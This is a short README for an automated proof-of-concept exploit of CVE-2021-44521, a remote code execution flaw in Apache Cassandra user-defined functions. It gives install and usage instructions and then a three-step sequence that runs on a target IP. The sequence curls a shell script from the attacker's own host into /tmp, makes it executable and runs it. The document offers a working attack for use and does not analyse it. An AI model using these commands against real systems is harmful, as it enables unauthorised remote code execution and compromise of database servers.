# CVE-2021-44521
Automated PoC of CVE-2021-44521
Credits to original poc: https://jfrog.com/blog/cve-2021-44521-exploiting-apache-cassandra-user-defined-functions-for-remote-code-execution/
# Requirements
Cassandra-driver
```bash
pip3 install cassandra-driver
```
# Usage
```bash
python3 poc.py <ip> <cmd>
```
Note that you can't do more command at a time, neither use pipes as of yet.
So run 
```bash
pyhon3 poc.py <ip> "curl http://<your-ip>/shell.sh -o /tmp/shell.sh"
python3 poc.py <ip> "chmod +x /tmp/shell.sh"
python3 poc.py <ip> "/tmp/shell.sh"
```
